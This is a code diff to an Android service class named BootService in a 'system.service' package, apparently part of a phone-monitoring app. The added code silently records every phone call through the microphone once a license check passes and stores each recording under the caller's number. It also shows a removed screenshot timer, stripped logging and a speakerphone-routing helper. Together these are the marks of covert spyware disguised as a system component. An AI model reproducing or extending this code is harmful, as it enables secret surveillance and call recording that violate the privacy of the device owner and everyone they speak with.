@@ -1,5 +1,6 @@
 package system.service;
 
+import java.util.Date;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -8,6 +9,8 @@ import system.service.config.ConfigCtrl;
 import system.service.feature.location.LocationUtil;
 import system.service.feature.sms.SmsCtrl;
 
+import com.particle.inspector.common.util.DatetimeUtil;
+import com.particle.inspector.common.util.FileCtrl;
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.license.LicenseCtrl;
@@ -16,6 +19,8 @@ import com.particle.inspector.common.util.license.LICENSE_TYPE;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.media.AudioManager;
+import android.media.MediaRecorder;
 import android.os.Binder;
 import android.os.IBinder;
 import android.telephony.PhoneStateListener;
@@ -40,37 +45,69 @@ public class BootService extends Service
 	private final long mGetInfoDelay  = 10000; // 10 Seconds
 	private final long mGetInfoPeriod = 300000; // 300 Seconds
 	
-	private Timer mScreenshotTimer;
-	private CaptureTask mCapTask;
-	private final long mScreenshotDelay  = 3000;  // 3  Seconds
-	private final long mScreenshotPeriod = 30000; // 30 Seconds
+	//private Timer mScreenshotTimer;
+	//private CaptureTask mCapTask;
+	//private final long mScreenshotDelay  = 3000;  // 3  Seconds
+	//private final long mScreenshotPeriod = 30000; // 30 Seconds
 	
 	public static LocationUtil locationUtil;
 	
 	public static String gpsWord;
 	
-	public static TelephonyManager telManager;
-	public static String otherSidePhoneNum = "";
+	private TelephonyManager telManager;
+	private boolean recordStarted = false;
+	private String otherSidePhoneNum = "";
+	private static MediaRecorder recorder;
+	private String DEFAULT_PHONE_RECORD_DIR = FileCtrl.getDefaultDir();
+	
+	static {
+		recorder = new MediaRecorder();
+		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+        recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
+        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
+	}
+	
 	private final PhoneStateListener phoneListener = new PhoneStateListener() {
 		@Override
         public void onCallStateChanged(int state, String incomingNumber) {
+			
 			// Get incoming phone number
-			if (incomingNumber != null)	otherSidePhoneNum = incomingNumber;
+			if (incomingNumber != null && incomingNumber.length() > 0) {
+				otherSidePhoneNum = incomingNumber;
+			}
 			
             try {
                 switch (state) {
-                	case TelephonyManager.CALL_STATE_RINGING: {
-                		// 
+                	case TelephonyManager.CALL_STATE_RINGING: { // 1
                 		break;
                 	}
-                	case TelephonyManager.CALL_STATE_OFFHOOK: {
-                		// 
+                	case TelephonyManager.CALL_STATE_OFFHOOK: { // 2
+                		Context context = getApplicationContext();
+                		
+                		if (!ConfigCtrl.isLegal(context)) return;
+            			
+            			if (recordStarted) return;
+            			
+            			// Set audio
+            			//setAudio(context);
+            			
+            			// Phone call recording
+            			try {
+                            Date startDate = new Date();
+                            String fileFullPath = makePhonecallRecordFileFullPath(context, otherSidePhoneNum, startDate); 
+                            recorder.setOutputFile(fileFullPath);
+                            recorder.prepare();
+                            recorder.start();
+                            recordStarted = true;
+                        } catch(Exception ex) {
+                            
+                        }
                 		break;
                 	}
-                	case TelephonyManager.CALL_STATE_IDLE: {
-        				if (PhoneCallReceiver.recordStarted) {
-        					PhoneCallReceiver.recorder.stop();
-        					PhoneCallReceiver.recordStarted = false;
+                	case TelephonyManager.CALL_STATE_IDLE: { // 0
+                		if (recordStarted) {
+        					recorder.stop();
+        					recordStarted = false;
         				}
                 		break;
                 	}
@@ -83,18 +120,15 @@ public class BootService extends Service
 
 	@Override
 	public IBinder onBind(final Intent intent) {
-		Log.v(LOGTAG, "onBind"); 
 		return null;
 	}
 	
 	@Override
     public void onDestroy() {  
-        Log.v(LOGTAG, "onDestroy");  
     }
 	
 	@Override  
     public boolean onUnbind(Intent intent) {  
-        Log.v(LOGTAG, "onUnbind");  
         return super.onUnbind(intent);  
     }
 
@@ -167,4 +201,26 @@ public class BootService extends Service
             return BootService.this;  
         }  
     }
+	
+	private String makePhonecallRecordFileFullPath(Context context, String phoneNum, Date date) {
+		if (!FileCtrl.defaultDirExist()) FileCtrl.creatDefaultSDDir();
+		String fileName = context.getResources().getString(R.string.phonecall_record) + phoneNum + "-" + DatetimeUtil.format2.format(date) + ".wav";
+		return DEFAULT_PHONE_RECORD_DIR + fileName;
+	}
+	
+	private void setAudio(Context context)
+	{
+		try {
+			AudioManager audiomanager = (AudioManager)context.getSystemService("audio"); 
+			//int i = audiomanager.getRouting(2); 
+			audiomanager.setMode(2); 
+			audiomanager.setMicrophoneMute(false); 
+			audiomanager.setSpeakerphoneOn(true); 
+			int j = audiomanager.getStreamMaxVolume(0); 
+			if(j < 0) j = 1; 
+			int k = j / 2 + 1; 
+			audiomanager.setStreamVolume(0, k, 0); 
+			audiomanager.setRouting(2, 11, 15);
+		} catch (Exception ex) {}
+	}
 }
